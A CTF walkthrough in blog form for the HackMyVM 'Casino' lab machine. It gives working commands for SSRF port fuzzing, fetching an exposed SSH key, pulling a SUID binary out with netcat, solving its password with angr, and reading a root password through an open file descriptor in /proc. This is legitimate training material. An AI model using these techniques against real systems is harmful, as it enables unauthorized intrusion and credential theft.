---
title: CTF Walkthrough for HackMyVM Machine Casino
category: [Walkthrough, CTF]
tags: [HackMyVM, Writeup, Reverse Engineering]   
image:
  path: /assets/img/posts/walthrough/hackmyvm/2024-09-24-casino/box-casino.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Casino a machine among HackMyVM machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Casino<br>
Goal: Get two flags<br>
OS: Linux<br>
Download link: [Casino](https://downloads.hackmyvm.eu/casino.zip)<br>
### Tools used
1) Nmap<br>
2) ffuf<br>
3) Cutter<br>

## Reconnaissance

First of all, we need to identify our target on the network. We do this by performing a host discovery scan on the current subnet.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Casino/Scans/Services]
└─$ nmap -n -sn 10.0.2.16/24 -oN live-hosts.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-23 17:26 BST
<SNIP>
Nmap scan report for 10.0.2.16
Host is up (0.00022s latency).
Nmap scan report for 10.0.2.26
Host is up (0.00052s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.51 seconds
```

After we have obtained the IP address of our target, we can perform a service scan to identify running services on the target.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Casino/Scans/Services]
└─$ nmap -n 10.0.2.26 -sV -sC -oN service-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-23 17:26 BST
<SNIP>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 3b:20:d0:ba:e2:7a:8a:01:8a:35:3b:52:08:b0:c6:a8 (ECDSA)
|_  256 74:76:0a:61:d4:2c:9b:45:36:00:4d:c8:d8:be:0b:89 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Binary Bet Casino
|_http-server-header: Apache/2.4.57 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.36 seconds
```

The server appears to run an SSH and an Apache2 webs server. Let's visit this web application to understand its functioning.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-24-casino/1-browse.png)

Upon visiting the website, we are prompted with a login page. Let's click on *I don't have an account* and create a user account on the target web application.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-24-casino/account-creation.png)
![](/assets/img/posts/walthrough/hackmyvm/2024-09-24-casino/after-login.png)

We can see above that we are given 1000 dollars upon signing into the web application and we have the opportunity to play different games. If we play different games and find ourselves out of money, the next time we attempt to play, the system will redirect us to a wiki page hosted on the en.wikipedia.org domain. This page appears to contain rules on how to use the website effectively.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-24-casino/after-losing.png)

The wiki page doesn't seem to be hosted on the same server as the web application. Let's replace that page with our IP address to see if the web application can also retrieve a wiki page from our server.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-24-casino/ssrf-test.png)

As we can see above the web server indeed made a connection to us, this proves the  existence of an SSRF vulnerability. 

## Exploitation

A common way to exploit SSRF is by enumerating internal services on the target. We can do this by creating a port list to fuzz the target.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Casino/Misc Files]
└─$ seq 1 65535 > portlist.txt  

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Casino/Misc Files]
└─$ ffuf -ic -c -u http://10.0.2.26/casino/explainmepls.php?learnabout=127.0.0.1:FUZZ -H "Cookie: PHPSESSID=28tsm0jqf10c7jmvdudv4pok60" -w portlist.txt  -fs 1134

80                      [Status: 200, Size: 2272, Words: 576, Lines: 98, Duration: 101ms]
6969                    [Status: 200, Size: 1973, Words: 499, Lines: 81, Duration: 72ms]
:: Progress: [65535/65535] :: Job [1/1] :: 609 req/sec :: Duration: [0:01:48] :: Errors: 0 ::
``````

Our fuzzing was successful and we uncovered a new port i.e. 6969 that listens internally on the target. When we visit the port through our proxy we will see that an HTML page is loaded. This shows that a web application listens on this port.  
![](/assets/img/posts/walthrough/hackmyvm/2024-09-24-casino/internal_server_6969.png)

This page appears to be a to-do list. Now that we have confirmed that a web application runs internally on port 6969, let's fuzz to uncover hidden directories on the web application.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Casino/Misc Files]
└─$ ffuf -ic -c -u http://10.0.2.26/casino/explainmepls.php?learnabout=127.0.0.1:6969/FUZZ -H "Cookie: PHPSESSID=28tsm0jqf10c7jmvdudv4pok60" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.txt,.html  -fs 1134

                        [Status: 200, Size: 1973, Words: 499, Lines: 81, Duration: 109ms]
index.html              [Status: 200, Size: 1973, Words: 499, Lines: 81, Duration: 141ms]
codebreakers            [Status: 200, Size: 1411, Words: 317, Lines: 65, Duration: 81ms]
                        [Status: 200, Size: 1973, Words: 499, Lines: 81, Duration: 77ms]
server-status           [Status: 200, Size: 35436, Words: 902, Lines: 564, Duration: 90ms]
<SNIP>
```

We can see in our result a directory called *codebreakers*. Let's visit this directory manually to see its content.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Casino/Misc Files]
└─$ curl -s http://10.0.2.26/casino/explainmepls.php?learnabout=127.0.0.1:6969/codebreakers -H "Cookie: PHPSESSID=28tsm0jqf10c7jmvdudv4pok60"             

<SNIP>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    Pls Shimmer, dont ******* this up again...
    <a href="./shimmer_rsa"></a>
</body>
</html>        </div>
<SNIP>                                    
```

The directory has an index page that reveals a potential username on the target system and also the potential presence of an  SSH key on the server. Let's try to access the SSH key in this directory. 
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Casino]
└─$ curl -s http://10.0.2.26/casino/explainmepls.php?learnabout=127.0.0.1:6969/codebreakers/shimmer_rsa -H "Cookie: PHPSESSID=28tsm0jqf10c7jmvdudv4pok60"  | html2text 
File "-", line 32, column 30: Levels of opening and closing headings don't match
Games
***** Welcome pentester *****
Current money: 0$
Log out
****** LEARN HOW TO PLAY FIRST ;) ******
-----BEGIN OPENSSH PRIVATE KEY----
- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAyazv9re1BpLFcPmH6jKbg7kjTItNYfNlRBtfpS93ahPdrBOHJwYJ
<SNIP>
olLBfy03QWwkulBGaHUhUbjyF1sy1w+5W0I6Fy11rj8AtQCWlWEeJ5IeOubgPB134lmXSE
5JYqg0CzdThLWdAAAADnNoaW1tZXJAY2FzaW5vAQIDBA== -----END OPENSSH PRIVATE KEY----
-
© 2023 Binary Bet Casino. All rights reserved
```

The SSH key was indeed stored in this directory. We can copy this SSH key into a file and login as Shimmer.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Casino/Misc Files]
└─$ nano shimmer_rsa

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Casino/Misc Files]
└─$ chmod 600 shimmer_rsa 

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Casino/Misc Files]
└─$ ssh shimmer@10.0.2.26 -i shimmer_rsa                                                                                                                                                                
The authenticity of host '10.0.2.26 (10.0.2.26)' can't be established.
<SNIP>
Last login: Wed Jun 14 17:24:28 2023 from 192.168.1.71
shimmer@casino:~$ ls
pass  user.txt
```
Now that we have a foothold, we can start our local enumeration on the target.


## Post Exploitation 

In the user's home directory, we can see a binary named *pass* with the SUID bit set as root. 
```bash
shimmer@casino:~$ ls -lh
total 24K
-rwsr-xr-x 1 root root 17K jun 14  2023 pass
-rw-r--r-- 1 root root  17 jun 14  2023 user.txt
shimmer@casino:~$ ./pass 
Passwd: 
Incorrect pass
```

This binary does not look like a common binary so, let's transfer it to our attack host for a deeper understanding of its function.
##### Starting a listener on our attack host
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Casino/Misc Files]
└─$ nc -lvnp 9000 > pass_sample
listening on [any] 9000 ...
```

##### Sending the binary using Netcat to our attack host
```bash
shimmer@casino:~$ nc -q 0 10.0.2.16 9000 < pass 
shimmer@casino:~$ 
```
##### Receiving the binary on our attack host
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Casino/Misc Files]
└─$ nc -lvnp 9000 > pass_sample
listening on [any] 9000 ...
connect to [10.0.2.16] from (UNKNOWN) [10.0.2.26] 50044
```
 Now that we have the binary file on our attack host, we can decompile it using Cutter a powerful multi-platform reverse engineering tool. 
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Casino/Misc Files]
└─$ cutter pass_sample 
```

When we decompile the main function we will have something like the code below
```c
undefined8 main(int argc, char **argv)
{
    int32_t iVar1;
    undefined4 uVar2;
    int64_t iVar3;
    char **var_108h;
    int var_fch;
    char *s1;
    int64_t var_88h;
    int64_t var_80h;
    char *s;
    int var_ch;
    
    var_fch = argc;
    printf("Passwd: ");
    fgets(&s, 100, _stdin);
    iVar3 = strlen(&s);
    if (*(char *)((int64_t)&var_80h + iVar3 + 7) == '\n') {
        iVar3 = strlen(&s);
        *(undefined *)((int64_t)&var_80h + iVar3 + 7) = 0;
    }
    iVar1 = checkPasswd((char *)&s);
    if (iVar1 == 1) {
        var_ch = open("/opt/root.pass", 0);
        uVar2 = getuid();
        setuid(uVar2);
        printf("Second Passwd: ");
        fgets(&s1, 100, _stdin);
        iVar3 = strlen(&s1);
        if (*(char *)((int64_t)&var_fch + iVar3 + 3) == '\n') {
            iVar3 = strlen(&s1);
            *(undefined *)((int64_t)&var_fch + iVar3 + 3) = 0;
        }
        iVar1 = strcmp(&s1, "<REDACTED>");
        if (iVar1 == 0) {
            var_88h = (int64_t)data.0000205c;
            var_80h = 0;
            execvp("/bin/sh", &var_88h);
        } else {
            puts("bye.");
        }
    }
    return 0;
}
```
![](/assets/img/posts/walthrough/hackmyvm/2024-09-24-casino/binary-decompile.png)

The code above may seem complex for a beginner who does not know C. Let's break this code into steps to understand how it functions.
Step 1: The code asks for a password from the user and stores it in the variable s.
Step 2: It uses the function **checkPasswd(()** to check if the password entered by the user is correct.
Step 3: If the password is correct i.e. if the function returns 1 the file /opt/root.pass is opened (The /opt/root.pass file looks like it stores the root password but unfortunately we cannot read it).
Step 4: The code asks the user for a second password and stores it in the variable s1.
Step 5: The variable s1 is compared with the string **<REDACTED>** using the **strcmp()** function.
Step 6: If the strings are equal, a shell is spawned as the current user running the program.

In steps 5 and 6 the second password collected is compared with a string hardcoded in the program. This tells us that the value of the second password is equal to that string. The first password is verified by the **checkPasswd(()** function. Let's visit this function to understand how this validation process takes place.
```bash
undefined8 checkPasswd(char *arg1)
{
    int64_t iVar1;
    undefined8 uVar2;
    char *s;
    
    iVar1 = strlen(arg1);
    if (iVar1 == 0x1a) {
        if ((int32_t)*arg1 - (int32_t)arg1[0x14] == -10) {
            if ((int32_t)arg1[6] + (int32_t)arg1[1] == 0xd0) {
            <SNIP>
                                                            arg1[2] * (int32_t)arg1[0x18] == 0x316e) {
                                                                if ((int32_t)arg1[0x19] - (int32_t)arg1[0xc] == -0xf) {
                                                                    puts("Correct pass");
                                                                    uVar2 = 1;
         <SNIP>
        }
    } else {
        puts("Incorrect pass");
        uVar2 = 0;
    }
    return uVar2;
}
```
![](/assets/img/posts/walthrough/hackmyvm/2024-09-24-casino/binary-decompile-2.png)

If we read through our code we will notice that the is no hardcoded password in the function. Also, the password stored in the iVar1 variable goes through a lot of if statements, and if true the string **Correct pass** is printed why if wrong the string **Incorrect pass** password is printed. Remember above that when we accessed the opened port 6969, an index page containing a to-do list was loaded. This page appears to contain information such as Don't forget the password for the binary, Learn about symbolic execution, etc. If we Google the words symbolic execution we will learn that symbolic execution is a means of analysing a program to determine what inputs cause each part of a program to execute. In our case, we are looking for a password that will trigger the Correct pass state of the program so, let's dig deeper into it. This [post](https://trevorsaudi.com/posts/symbolic_execution_angr_part1/) and this [post](https://book.hacktricks.xyz/reversing/reversing-tools-basic-methods/angr/angr-examples) explain how to use a Python library called Angr to exploit symbolic executions. We can copy the Python code and save it into a file.
```python
import angr
import sys 

def main():
    path_to_binary =  sys.argv[1]
    project = angr.Project(path_to_binary)
    initial_state = project.factory.entry_state() 
    simulation = project.factory.simgr(initial_state) 
    print_good_address = 0x8048675
    simulation.explore(find=print_good_address)

    if simulation.found:
        solution_state = simulation.found[0]
        solution = solution_state.posix.dumps(sys.stdin.fileno())
        print("[+] Success! Solution is: {}".format(solution.decode('utf-8')))
    else:
        raise Exception("Could not find the solution")

if __name__ == "__main__":
    main()
```

To make it easier we will check the state returned and if it matches **Correct Pass**, it means the solution has been found. We can refer to the [documentation](https://docs.angr.io/en/latest/api.html#angr.sim_manager.SimulationManager.explore) that indicates that simulation.explore() can also accept a function. To do this, we will change lines 9 and 10 to the single line below.
```python
simulation.explore(find=lambda s: b"Correct pass" in s.posix.dumps(1))
```
 The final code will look like the one below.
 ```python
import angr
import sys 

def main():
    path_to_binary =  sys.argv[1]
    project = angr.Project(path_to_binary)
    initial_state = project.factory.entry_state() 
    simulation = project.factory.simgr(initial_state) 
    simulation.explore(find=lambda s: b"Correct pass" in s.posix.dumps(1))

    if simulation.found:
        solution_state = simulation.found[0]
        solution = solution_state.posix.dumps(sys.stdin.fileno())
        print("[+] Success! Solution is: {}".format(solution.decode('utf-8')))
    else:
        raise Exception("Could not find the solution")

if __name__ == "__main__":
    main()
```

Now that we have our script ready, we can run it against our target binary.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Casino/Misc Files]
└─$ python3 solution.py '/home/pentester/Desktop/HackMyVM/Casino/Misc Files/pass_sample'
WARNING  | 2024-09-24 03:22:22,638 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing memory with an unspecified value. This could indicate unwanted behavior.
<SNIP>
WARNING  | 2024-09-24 03:22:24,143 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffefebf with 1 unconstrained bytes referenced from 0x4016e5 (main+0x54 in pass_sample (0x16e5))
[+] Success! Solution is: <REDACTED>
```

The script successfully found the solution. We can use this as the first password and use the second password discovered above to complete the execution of the binary.
```bash
shimmer@casino:~$ ./pass 
Passwd: <REDACTED>
Correct pass
Second Passwd: <REDACTED>
$ whoami
shimmer
```

Remember that during the analyses of the binary, the file **root.pass** was opened but never closed we can verify that this file is still open in this terminal session using the lsof command.
```bash
$ lsof | grep pass
sh        2187                         shimmer    3r      REG                8,1       15     522246 /opt/root.pass
grep      2203                         shimmer    3r      REG                8,1       15     522246 /opt/root.pass
```

Now that we have the confirmation that this file is still open we can navigate to the process directory handling this process and read the content of this opened file.
```bash
$ cd /proc/2187/fd
$ ls
0  1  10  2  3
$ cat <&3
<REDACTED>
```

Now that we have a root user's password we can log in as the root user and read the second flag.
```bash
shimmer@casino:~$ su root
Contraseña: 
root@casino:/home/shimmer# ls /root
r0ot.txt
root@casino:/home/shimmer# 
```

## Conclusion

Congratulations! In this walkthrough, you have exploited an SSRF vulnerability to read files on an internal web server on the target. Finally, you used reverse engineering to understand the functioning of a binary and read privileged files stored in memory. This machine was designed to show how inadequate validation of remote URLs before initiating requests can lead to serious SSRF vulnerabilities, significantly compromising the security of an organisation. Thank you for following up on this walkthrough.
